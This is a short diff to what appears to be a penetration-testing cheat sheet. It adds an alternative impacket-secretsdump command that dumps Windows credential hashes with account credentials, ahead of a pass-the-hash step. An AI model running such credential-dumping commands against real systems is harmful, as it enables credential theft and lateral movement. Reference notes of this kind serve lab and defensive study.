@@ -60,6 +60,8 @@ Dump hashes using account credentials:
 
 ```shell
 impacket-secretsdump -dc-ip $TARGET_IP $USER:$PASSWORD@$TARGET_DOMAIN
+#OR try
+impacket-secretsdump $USER:$PASSWORD@$TARGET_IP
 ```
 
 Connect to Windows Machine using obtained hash (pass the hash):
